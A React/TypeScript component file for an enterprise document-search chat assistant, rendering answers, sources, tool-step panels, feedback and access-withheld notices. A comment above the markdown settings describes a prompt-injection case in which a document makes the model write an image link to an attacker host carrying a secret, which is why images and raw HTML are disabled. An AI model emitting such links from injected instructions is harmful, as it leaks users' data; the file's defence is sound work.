import { useMemo, useState, type ReactNode, type Ref } from "react"
import ReactMarkdown, { type Components } from "react-markdown"
import remarkGfm from "remark-gfm"
import {
  BadgeCheck,
  BookOpen,
  Check,
  ChevronLeft,
  ChevronRight,
  Clock,
  Copy,
  CornerDownRight,
  ExternalLink,
  FileText,
  GitBranch,
  Globe,
  Info,
  Loader2,
  Lock,
  MoreHorizontal,
  RefreshCw,
  RotateCcw,
  SearchX,
  Share2,
  ShieldAlert,
  Sparkles,
  ThumbsDown,
  ThumbsUp,
  TriangleAlert,
} from "lucide-react"
import { toast } from "sonner"

import { CitationChip, SourceSheet } from "@/components/citations"
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible"
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu"
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { Textarea } from "@/components/ui/textarea"
import { ToggleGroup, ToggleGroupItem } from "@/components/ui/toggle-group"
import { Tooltip, TooltipContent, TooltipTrigger } from "@/components/ui/tooltip"
import {
  api,
  type AnswerState,
  type Feedback,
  type FeedbackReason,
  type Source,
  type Step,
  type StepLine,
  type VerifiedBadge,
} from "@/lib/api"
import { branchOf } from "@/lib/chat-history"
import { CitationsContext, citedNumber, placeOf, remarkCitations } from "@/lib/citations"

// One line of the steps panel, live while the assistant works.
export interface LiveStep extends StepLine {
  done: boolean
}

// A message as the chat shows it: a question, or an answer (streaming, or finished
// in one of the AnswerStates).
export interface Message {
  key: string // stable React key
  id?: string // the saved message's id, once the server has one
  role: "user" | "assistant"
  text: string
  state?: AnswerState
  question?: string // an answer's question (Rephrase, Try again)
  sources?: Source[]
  trace?: Step[] // admins: each tool's raw input and output
  standalone?: string | null // a follow-up as it was searched
  withheld?: boolean
  feedback?: Feedback | null
  limited?: string // turned away by a rate limit: the server's words
  streaming?: boolean
  status?: string
  steps?: LiveStep[]
  followups?: string[] // questions to ask next (the last answer shows them)
  siblings?: string[] // its versions, with it: "‹ 2 / 3 ›" (lib/chat-history.ts branchOf)
  copy?: string | null // a shared answer's markdown, ready to copy
  verified?: VerifiedBadge | null // served from a verified answer (PL-27)
}

// What an answer's buttons do. Without the optional ones (a shared chat, read only)
// those buttons aren't shown.
export interface AnswerActions {
  onRetry?: (message: Message) => void
  onRephrase?: (question: string) => void
  onFeedback?: (message: Message, feedback: Feedback | null) => void
  onRegenerate?: (message: Message) => void
  onShare?: (message: Message) => void
  onFork?: (message: Message) => void // "Branch in new chat"
  onBranch?: (message: Message, to: string) => void // show another version
  onFollowup?: (question: string) => void
  onAskYourself?: (question: string) => void // a withheld answer, asked with your own role
  onVerify?: (message: Message) => void // HR / Admin: "Save as verified answer"
  busy?: boolean // an answer is being written: no new branches meanwhile
  hideSteps?: boolean // the workspace's admin turned the steps panel off for members
}

// One line of the sources under an answer. A cited passage opens in the source
// viewer (numbered like its [S#] chips); a page read whole opens its link.
function SourceCard({
  source,
  index,
  onOpen,
}: {
  source: Source
  index: number
  onOpen: (source: Source) => void
}) {
  const general = source.kind === "general_knowledge"
  const isWiki = source.provider.toLowerCase().includes("outline")
  const Icon = general ? Globe : isWiki ? BookOpen : FileText
  const label = general ? `General knowledge · ${source.provider}` : source.provider
  const place = placeOf(source)
  const passage = source.chunk_id || source.snippet
  const body = (
    <div className="flex items-center gap-3 rounded-lg border bg-card px-3 py-2 text-left text-sm transition-colors hover:bg-muted/60">
      <span className="flex size-6 shrink-0 items-center justify-center rounded-md bg-muted text-xs font-medium tabular-nums">
        {source.n ?? index}
      </span>
      <Icon className="size-4 shrink-0 text-muted-foreground" />
      {/* On a phone the provider goes under the title, so the title keeps the width. */}
      <span className="min-w-0 flex-1">
        <span className="block truncate font-medium">{source.title}</span>
        {place && <span className="block truncate text-xs text-muted-foreground">{place}</span>}
        <span className="block truncate text-xs text-muted-foreground sm:hidden">{label}</span>
      </span>
      <Badge
        variant={general ? "outline" : "secondary"}
        className="hidden max-w-[45%] sm:inline-flex"
      >
        <span className="truncate">{label}</span>
      </Badge>
      {source.url && !passage && <ExternalLink className="size-3.5 shrink-0 text-muted-foreground" />}
    </div>
  )
  if (passage) {
    return (
      <button
        type="button"
        onClick={() => onOpen(source)}
        aria-label={`Open source ${source.n ?? index}: ${source.title}${place ? `, ${place}` : ""}`}
        className="min-w-0 rounded-lg outline-none focus-visible:ring-[3px] focus-visible:ring-ring/50"
      >
        {body}
      </button>
    )
  }
  return source.url ? (
    <a href={source.url} target="_blank" rel="noreferrer" className="min-w-0">
      {body}
    </a>
  ) : (
    body
  )
}

function StepRow({ step }: { step: LiveStep }) {
  const blocked = step.result === "blocked by access rules" || step.result === "failed"
  // The icon's shape and a screen-reader word carry the status, not only its colour.
  return (
    <div className="flex items-start gap-2 text-xs">
      <span className="mt-0.5 flex size-3.5 shrink-0 items-center justify-center">
        {!step.done ? (
          <Loader2 className="size-3.5 animate-spin text-muted-foreground" aria-hidden />
        ) : blocked ? (
          <TriangleAlert className="size-3.5 text-amber-600" aria-hidden />
        ) : (
          <Check className="size-3.5 text-emerald-600" aria-hidden />
        )}
        <span className="sr-only">{!step.done ? "Running:" : blocked ? "Problem:" : "Done:"}</span>
      </span>
      <span className={step.done ? "text-muted-foreground" : "text-foreground"}>
        {step.label}
        {step.done ? "" : "…"}
        {step.result && <span className="text-muted-foreground/80"> · {step.result}</span>}
      </span>
    </div>
  )
}

// What the assistant did: live while it works, then folded into one line. The raw
// tool input and output ("Technical details") come from the server for admins only.
function StepsPanel({ message }: { message: Message }) {
  const steps = message.steps ?? []
  const details = (message.trace ?? []).filter((t) => t.input !== undefined)
  if (message.streaming) {
    return (
      <div className="space-y-1.5 rounded-xl border border-border/60 bg-muted/30 px-3 py-2.5">
        {steps.length === 0 && (
          <div className="flex items-center gap-2 text-xs text-foreground">
            <Loader2 className="size-3.5 animate-spin text-muted-foreground" />
            {message.status ?? "Thinking"}…
          </div>
        )}
        {steps.map((st) => (
          <StepRow key={st.id} step={st} />
        ))}
      </div>
    )
  }
  if (!steps.length) return null
  const summary = steps.map((st) => st.label).join(" · ")
  return (
    <Collapsible>
      <CollapsibleTrigger className="group flex max-w-full items-center gap-1.5 text-left text-xs text-muted-foreground hover:text-foreground">
        <ChevronRight className="size-3.5 shrink-0 transition-transform group-data-[state=open]:rotate-90" />
        <Check className="size-3.5 shrink-0 text-emerald-600" />
        <span className="shrink-0">
          {steps.length} step{steps.length === 1 ? "" : "s"}
        </span>
        <span className="truncate opacity-70">· {summary}</span>
      </CollapsibleTrigger>
      <CollapsibleContent className="mt-2 space-y-2">
        <div className="space-y-1.5 rounded-xl border border-border/60 bg-muted/30 px-3 py-2.5">
          {message.standalone && (
            <p className="text-xs text-muted-foreground">
              Searched for: <span className="text-foreground">{message.standalone}</span>
            </p>
          )}
          {steps.map((st) => (
            <StepRow key={st.id} step={st} />
          ))}
        </div>
        {details.length > 0 && (
          <Collapsible>
            <CollapsibleTrigger className="group flex items-center gap-1.5 text-xs text-muted-foreground hover:text-foreground">
              <ChevronRight className="size-3.5 shrink-0 transition-transform group-data-[state=open]:rotate-90" />
              Technical details
            </CollapsibleTrigger>
            <CollapsibleContent className="mt-2 space-y-2">
              {details.map((step, i) => (
                <div key={i} className="rounded-lg border bg-muted/40 p-3 text-xs">
                  <div className="mb-1 flex items-center gap-2">
                    <span className="font-medium">Step {i + 1}</span>
                    <Badge variant="outline" className="font-mono">
                      {step.tool}
                    </Badge>
                  </div>
                  <p className="font-mono text-muted-foreground">
                    input: {JSON.stringify(step.input)}
                  </p>
                  <p className="mt-1 whitespace-pre-wrap break-words text-muted-foreground">
                    {step.output}
                  </p>
                </div>
              ))}
            </CollapsibleContent>
          </Collapsible>
        )}
      </CollapsibleContent>
    </Collapsible>
  )
}

// Too many questions in the last minute: a pause, not a failure, so no red.
function LimitNotice({ text }: { text: string }) {
  return (
    <div className="flex items-start gap-2.5 rounded-xl border border-border/60 bg-muted/30 px-3 py-2.5 text-sm">
      <Clock className="mt-0.5 size-4 shrink-0 text-muted-foreground" />
      <div className="min-w-0 space-y-0.5">
        <p className="font-medium">Give it a moment</p>
        <p className="text-muted-foreground">{text}</p>
      </div>
    </div>
  )
}

// A one-line note above an answer that is only partly from the documents.
function AnswerNote({ icon: Icon, children }: { icon: typeof Info; children: string }) {
  return (
    <p className="flex items-center gap-1.5 text-xs font-medium text-muted-foreground">
      <Icon className="size-3.5 shrink-0" />
      {children}
    </p>
  )
}

// Answers never load images or render raw HTML: a document could tell the model to
// write ![](https://attacker/?q=<secret>), and the browser would send it on its own.
// An image shows as its alt text instead.
// A [S#] marker (made a "#cite-#" link by remarkCitations) is a citation chip.
// Tables (e.g. rows quoted from an attached spreadsheet, C24) as the app's own
// tables: wide ones scroll sideways inside the answer, not the page.
const ANSWER_MARKDOWN: Components = {
  img: ({ alt }) => (alt ? <span className="text-muted-foreground">[{alt}]</span> : null),
  table: ({ children }) => (
    <div className="my-3 rounded-lg border border-border/70">
      <Table>{children}</Table>
    </div>
  ),
  thead: ({ children }) => <TableHeader className="bg-muted/50">{children}</TableHeader>,
  tbody: ({ children }) => <TableBody>{children}</TableBody>,
  tr: ({ children }) => <TableRow>{children}</TableRow>,
  th: ({ children }) => <TableHead className="h-8 px-3">{children}</TableHead>,
  td: ({ children }) => <TableCell className="px-3 py-1.5 whitespace-normal">{children}</TableCell>,
  a: ({ href, title, children }) => {
    const n = citedNumber(href)
    return n ? (
      <CitationChip n={n} />
    ) : (
      <a href={href} title={title}>
        {children}
      </a>
    )
  },
}

function Markdown({ text, streaming }: { text: string; streaming?: boolean }) {
  return (
    <div className="max-w-none text-sm leading-relaxed [&_a]:underline [&_li]:my-0.5 [&_ol]:list-decimal [&_ol]:pl-5 [&_p]:my-2 [&_ul]:list-disc [&_ul]:pl-5">
      <ReactMarkdown
        remarkPlugins={[remarkGfm, remarkCitations]}
        skipHtml
        components={ANSWER_MARKDOWN}
      >
        {text}
      </ReactMarkdown>
      {streaming && (
        <span className="ml-0.5 inline-block h-4 w-1.5 translate-y-0.5 animate-pulse rounded-sm bg-foreground/60" />
      )}
    </div>
  )
}

const REASONS: { value: FeedbackReason; label: string }[] = [
  { value: "wrong", label: "Wrong or made up" },
  { value: "wrong_source", label: "Wrong source" },
  { value: "missing", label: "Didn't find it, but it exists" },
  { value: "outdated", label: "Out of date" },
  { value: "refused", label: "Refused when it shouldn't" },
  { value: "unclear", label: "Too long or unclear" },
]
const THANKS = "Thanks. An admin can see this answer and your note."

// Thumbs up / down under a finished answer. Thumbs down asks why.
function FeedbackRow({
  message,
  onFeedback,
}: {
  message: Message
  onFeedback: NonNullable<AnswerActions["onFeedback"]>
}) {
  const [open, setOpen] = useState(false)
  const [reasons, setReasons] = useState<FeedbackReason[]>([])
  const [comment, setComment] = useState("")
  const [saving, setSaving] = useState(false)
  const rating = message.feedback?.rating
  const id = message.id
  if (!id) return null

  async function send(next: 1 | -1 | null) {
    if (!id) return
    setSaving(true)
    try {
      if (next === null) {
        await api.removeFeedback(id)
        onFeedback(message, null)
      } else {
        const saved = await api.giveFeedback(id, next, next === -1 ? reasons : [], comment || null)
        onFeedback(message, saved)
        toast.success(next === 1 ? "Thanks for the feedback." : THANKS)
      }
      setOpen(false)
    } catch (err) {
      toast.error(err instanceof Error ? err.message : "Couldn't save your feedback.")
    } finally {
      setSaving(false)
    }
  }

  return (
    <div className="flex items-center gap-0.5 text-muted-foreground">
      <Tooltip>
        <TooltipTrigger asChild>
          <Button
            variant="ghost"
            size="icon-sm"
            aria-label="Helpful"
            aria-pressed={rating === 1}
            disabled={saving}
            onClick={() => send(rating === 1 ? null : 1)}
            className={rating === 1 ? "text-foreground" : ""}
          >
            <ThumbsUp className={rating === 1 ? "fill-current" : ""} />
          </Button>
        </TooltipTrigger>
        <TooltipContent>{rating === 1 ? "Undo" : "Helpful"}</TooltipContent>
      </Tooltip>
      <Popover
        open={open}
        onOpenChange={(next) => {
          setOpen(next)
          if (next) {
            setReasons(message.feedback?.rating === -1 ? message.feedback.reasons : [])
            setComment(message.feedback?.rating === -1 ? (message.feedback.comment ?? "") : "")
          }
        }}
      >
        <Tooltip>
          <TooltipTrigger asChild>
            <PopoverTrigger asChild>
              <Button
                variant="ghost"
                size="icon-sm"
                aria-label="Not helpful"
                aria-pressed={rating === -1}
                disabled={saving}
                className={rating === -1 ? "text-foreground" : ""}
              >
                <ThumbsDown className={rating === -1 ? "fill-current" : ""} />
              </Button>
            </PopoverTrigger>
          </TooltipTrigger>
          <TooltipContent>Not helpful</TooltipContent>
        </Tooltip>
        <PopoverContent align="start" className="w-80 gap-3">
          <p className="text-sm font-medium">What went wrong?</p>
          <ToggleGroup
            type="multiple"
            variant="outline"
            size="sm"
            spacing={1}
            value={reasons}
            onValueChange={(v) => setReasons(v as FeedbackReason[])}
            className="w-full flex-wrap"
            aria-label="Reasons"
          >
            {REASONS.map((r) => (
              <ToggleGroupItem key={r.value} value={r.value} className="text-xs">
                {r.label}
              </ToggleGroupItem>
            ))}
          </ToggleGroup>
          <Textarea
            value={comment}
            onChange={(e) => setComment(e.target.value)}
            placeholder="Anything else? (optional)"
            aria-label="Note for an admin"
            maxLength={1000}
            className="min-h-16"
          />
          <p className="text-xs text-muted-foreground">
            HR and admins see this answer, its question and your note.
          </p>
          <div className="flex justify-end gap-2">
            {rating === -1 && (
              <Button variant="ghost" size="sm" disabled={saving} onClick={() => send(null)}>
                Remove
              </Button>
            )}
            <Button size="sm" disabled={saving} onClick={() => send(-1)}>
              {saving && <Loader2 className="animate-spin" />}
              Send feedback
            </Button>
          </div>
        </PopoverContent>
      </Popover>
    </div>
  )
}

function RetryButton({
  message,
  onRetry,
}: {
  message: Message
  onRetry: NonNullable<AnswerActions["onRetry"]>
}) {
  return (
    <Button variant="outline" size="sm" onClick={() => onRetry(message)}>
      <RotateCcw />
      Try again
    </Button>
  )
}

// The body of an answer, by how it ended (C5). "Not found", "blocked" and failures
// are notices, so they can't be mistaken for an answer from the documents.
function AnswerBody({ message, actions }: { message: Message; actions: AnswerActions }) {
  const { state, text } = message
  if (message.withheld) {
    // Decision D1: the whole answer is withheld, not only its sources: its text was
    // written from them.
    const ask = actions.onAskYourself
    return (
      <Alert>
        <Lock />
        <AlertTitle>{ask ? "You don't have access to some sources" : "Answer hidden"}</AlertTitle>
        <AlertDescription>
          <p>
            {ask
              ? "This answer used documents your role can't see, so it isn't shown. Ask it yourself: you'll get an answer from what you can see."
              : "This answer used documents your current role can't see, so it isn't shown."}
          </p>
          {ask && message.question && (
            <Button variant="outline" size="sm" className="mt-2" onClick={() => ask(message.question!)}>
              Ask it yourself
            </Button>
          )}
        </AlertDescription>
      </Alert>
    )
  }
  if (state === "blocked") {
    return (
      <Alert>
        <ShieldAlert />
        <AlertTitle>Can't answer that</AlertTitle>
        <AlertDescription>{text}</AlertDescription>
      </Alert>
    )
  }
  if (state === "not_found") {
    return (
      <Alert>
        <SearchX />
        <AlertTitle>Your documents don't cover this</AlertTitle>
        <AlertDescription>
          <Markdown text={text} />
          <div className="mt-2 flex flex-wrap gap-2">
            {message.question && actions.onRephrase && (
              <Button variant="outline" size="sm" onClick={() => actions.onRephrase!(message.question!)}>
                Rephrase
              </Button>
            )}
            {message.id && actions.onFeedback && message.feedback?.reasons?.includes("missing") !== true && (
              <Button
                variant="ghost"
                size="sm"
                onClick={async () => {
                  try {
                    const saved = await api.giveFeedback(message.id!, -1, ["missing"])
                    actions.onFeedback!(message, saved)
                    toast.success("Thanks. HR and admins can see that this is missing.")
                  } catch (err) {
                    toast.error(err instanceof Error ? err.message : "Couldn't tell an admin.")
                  }
                }}
              >
                Tell an admin it's missing
              </Button>
            )}
          </div>
        </AlertDescription>
      </Alert>
    )
  }
  if (state === "error") {
    return (
      <Alert variant="destructive">
        <TriangleAlert />
        <AlertTitle>Couldn't answer</AlertTitle>
        <AlertDescription>
          <p>{text || "Something went wrong."}</p>
          {message.id && actions.onRetry && (
            <div className="mt-2">
              <RetryButton message={message} onRetry={actions.onRetry} />
            </div>
          )}
        </AlertDescription>
      </Alert>
    )
  }
  if (state === "pending") {
    return (
      <p className="flex items-center gap-2 text-sm text-muted-foreground">
        <Loader2 className="size-4 animate-spin" />
        Still being written. Reload in a moment to see it.
      </p>
    )
  }
  if (message.verified) {
    // C18: an approved answer, in a bordered panel that says who verified it and when.
    const v = message.verified
    const date = new Date(v.at * 1000).toLocaleDateString(undefined, { day: "numeric", month: "short" })
    return (
      <div className="rounded-xl border border-foreground/15 bg-background" aria-label="Verified answer">
        <div className="flex flex-wrap items-center gap-x-2 gap-y-0.5 border-b border-border/70 px-3 py-2 text-xs">
          <BadgeCheck className="size-4 text-foreground" aria-hidden />
          <span className="font-medium text-foreground">
            Verified by {v.by} · {date}
          </span>
          <span className="min-w-0 truncate text-muted-foreground">{v.title}</span>
        </div>
        <div className="px-3 py-2.5">
          <Markdown text={text} />
        </div>
      </div>
    )
  }
  return (
    <div className="space-y-2">
      {state === "partial" && (
        <AnswerNote icon={Info}>Partly answered: the documents don't cover all of it</AnswerNote>
      )}
      {state === "general_knowledge" && (
        <AnswerNote icon={Globe}>General knowledge, not from your documents</AnswerNote>
      )}
      {text && <Markdown text={text} streaming={message.streaming} />}
      {state === "stopped" && (
        <div className="flex flex-wrap items-center gap-2">
          <span className="text-xs font-medium text-muted-foreground">
            {text ? "Stopped before the end" : "Stopped"}
          </span>
          {message.id && actions.onRetry && <RetryButton message={message} onRetry={actions.onRetry} />}
        </div>
      )}
    </div>
  )
}

const RATEABLE: AnswerState[] = ["answered", "partial", "general_knowledge", "not_found", "blocked"]
// Answers worth copying, sharing or branching from.
const SHAREABLE: AnswerState[] = ["answered", "partial", "general_knowledge", "not_found", "stopped"]

// "‹ 2 / 3 ›" under a question or an answer that has other versions (C10).
export function BranchNav({
  message,
  onBranch,
  disabled,
}: {
  message: Message
  onBranch?: AnswerActions["onBranch"]
  disabled?: boolean
}) {
  const branch = branchOf(message.id, message.siblings)
  if (!branch || !onBranch) return null
  const what = message.role === "user" ? "question" : "answer"
  return (
    <div className="flex items-center text-muted-foreground" role="group" aria-label={`Versions of this ${what}`}>
      <Button
        variant="ghost"
        size="icon-xs"
        aria-label={`Previous version of this ${what}`}
        disabled={disabled || !branch.prev}
        onClick={() => branch.prev && onBranch(message, branch.prev)}
        className="pointer-coarse:size-10"
      >
        <ChevronLeft />
      </Button>
      <span className="min-w-8 text-center text-xs tabular-nums" aria-live="polite">
        {branch.index} / {branch.count}
      </span>
      <Button
        variant="ghost"
        size="icon-xs"
        aria-label={`Next version of this ${what}`}
        disabled={disabled || !branch.next}
        onClick={() => branch.next && onBranch(message, branch.next)}
        className="pointer-coarse:size-10"
      >
        <ChevronRight />
      </Button>
    </div>
  )
}

function IconAction({
  label,
  onClick,
  disabled,
  children,
}: {
  label: string
  onClick: () => void
  disabled?: boolean
  children: ReactNode
}) {
  return (
    <Tooltip>
      <TooltipTrigger asChild>
        <Button
          variant="ghost"
          size="icon-sm"
          aria-label={label}
          disabled={disabled}
          onClick={onClick}
          className="pointer-coarse:size-10"
        >
          {children}
        </Button>
      </TooltipTrigger>
      <TooltipContent>{label}</TooltipContent>
    </Tooltip>
  )
}

// Copy: the answer as markdown, its citations as footnotes (C25).
async function copyAnswer(message: Message) {
  try {
    const text = message.copy ?? (message.id ? await api.answerMarkdown(message.id) : message.text)
    await navigator.clipboard.writeText(text)
    toast.success("Copied, with its sources as footnotes.")
  } catch (err) {
    toast.error(err instanceof Error && err.message ? err.message : "Couldn't copy it.")
  }
}

// Under a finished answer: Copy, thumbs, Regenerate, Share, More, and its versions.
function ActionRow({ message, actions }: { message: Message; actions: AnswerActions }) {
  const state = message.state
  const shareable = !!state && SHAREABLE.includes(state) && !message.withheld
  const rateable = !!state && RATEABLE.includes(state) && !message.withheld
  return (
    <div className="flex flex-wrap items-center gap-0.5 text-muted-foreground">
      {shareable && (
        <IconAction label="Copy" onClick={() => copyAnswer(message)}>
          <Copy />
        </IconAction>
      )}
      {rateable && message.id && actions.onFeedback && (
        <FeedbackRow key={message.id} message={message} onFeedback={actions.onFeedback} />
      )}
      {actions.onRegenerate && message.id && state !== "error" && (
        <IconAction label="Write the answer again" disabled={actions.busy} onClick={() => actions.onRegenerate!(message)}>
          <RefreshCw />
        </IconAction>
      )}
      {actions.onShare && message.id && shareable && (
        <IconAction label="Share" onClick={() => actions.onShare!(message)}>
          <Share2 />
        </IconAction>
      )}
      {(actions.onFork || actions.onVerify) && message.id && shareable && (
        <DropdownMenu>
          <Tooltip>
            <TooltipTrigger asChild>
              <DropdownMenuTrigger asChild>
                <Button variant="ghost" size="icon-sm" aria-label="More" className="pointer-coarse:size-10">
                  <MoreHorizontal />
                </Button>
              </DropdownMenuTrigger>
            </TooltipTrigger>
            <TooltipContent>More</TooltipContent>
          </Tooltip>
          <DropdownMenuContent align="start">
            {actions.onFork && (
              <DropdownMenuItem disabled={actions.busy} onSelect={() => actions.onFork!(message)}>
                <GitBranch /> Branch in new chat
              </DropdownMenuItem>
            )}
            {actions.onVerify && !message.verified && (state === "answered" || state === "partial") && (
              <DropdownMenuItem onSelect={() => actions.onVerify!(message)}>
                <BadgeCheck /> Save as verified answer
              </DropdownMenuItem>
            )}
          </DropdownMenuContent>
        </DropdownMenu>
      )}
      <BranchNav message={message} onBranch={actions.onBranch} disabled={actions.busy} />
    </div>
  )
}

export function AssistantMessage({
  message,
  actions,
  last = false,
  ref,
}: {
  message: Message
  actions: AnswerActions
  last?: boolean // the newest answer: it shows its follow-ups
  ref?: Ref<HTMLDivElement>
}) {
  const sources = useMemo(
    () => (message.withheld ? [] : (message.sources ?? [])),
    [message.withheld, message.sources],
  )
  const finished = !message.streaming && !message.limited
  const [opened, setOpened] = useState<Source | null>(null)
  const citations = useMemo(
    () => ({
      byNumber: new Map(sources.filter((s) => s.n !== undefined).map((s) => [s.n!, s])),
      open: setOpened,
    }),
    [sources],
  )
  return (
    <CitationsContext value={citations}>
      <div
        ref={ref}
        tabIndex={-1}
        className="flex gap-3 rounded-lg outline-none focus-visible:ring-[3px] focus-visible:ring-ring/50"
        data-state={message.state}
        aria-label="Answer"
      >
        <div className="flex size-8 shrink-0 items-center justify-center rounded-full bg-primary text-primary-foreground">
          <Sparkles className={message.streaming ? "size-4 animate-pulse" : "size-4"} />
        </div>
        <div className="min-w-0 flex-1 space-y-3 pt-1">
          {!actions.hideSteps && <StepsPanel message={message} />}
          {message.limited && <LimitNotice text={message.limited} />}
          {!message.limited && (message.streaming ? message.text && <Markdown text={message.text} streaming /> : <AnswerBody message={message} actions={actions} />)}

          {sources.length > 0 && (
            <div className="space-y-2">
              <p className="text-xs font-medium uppercase tracking-wide text-muted-foreground">
                Sources
              </p>
              <div className="grid min-w-0 grid-cols-1 gap-2">
                {sources.map((s, i) => (
                  <SourceCard
                    key={s.chunk_id ?? `${s.provider}-${s.title}`}
                    source={s}
                    index={i + 1}
                    onOpen={setOpened}
                  />
                ))}
              </div>
            </div>
          )}

          {finished && message.state && message.state !== "pending" && (
            <ActionRow message={message} actions={actions} />
          )}

          {finished && last && !actions.busy && actions.onFollowup && !message.withheld
            && (message.followups?.length ?? 0) > 0 && (
            <div className="flex flex-col items-start gap-1.5" aria-label="Follow-up questions" role="group">
              {message.followups!.map((f) => (
                <Button
                  key={f}
                  variant="outline"
                  size="sm"
                  onClick={() => actions.onFollowup!(f)}
                  className="h-auto max-w-full justify-start whitespace-normal py-1.5 text-left font-normal pointer-coarse:min-h-10"
                >
                  <CornerDownRight data-icon="inline-start" className="text-muted-foreground" />
                  {f}
                </Button>
              ))}
            </div>
          )}
        </div>
        <SourceSheet source={opened} onOpenChange={(open) => !open && setOpened(null)} />
      </div>
    </CitationsContext>
  )
}
